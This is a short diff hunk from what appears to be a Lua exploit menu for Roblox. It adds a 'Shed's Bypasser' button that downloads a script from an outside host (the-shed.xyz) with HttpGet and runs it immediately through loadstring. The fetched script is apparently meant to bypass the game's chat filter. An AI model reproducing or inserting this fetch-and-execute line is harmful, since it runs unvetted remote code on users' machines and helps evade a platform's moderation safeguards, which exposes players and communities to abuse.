@@ -2469,6 +2469,10 @@ do -- Example UI
             end
             
         	end)
+		
+		Tab:AddButton("Shed's Bypasser", function()
+			loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
+		end)
 	
 		Tab:AddTextBox("Remote Event Multiplier", function(repeattimes)
 		
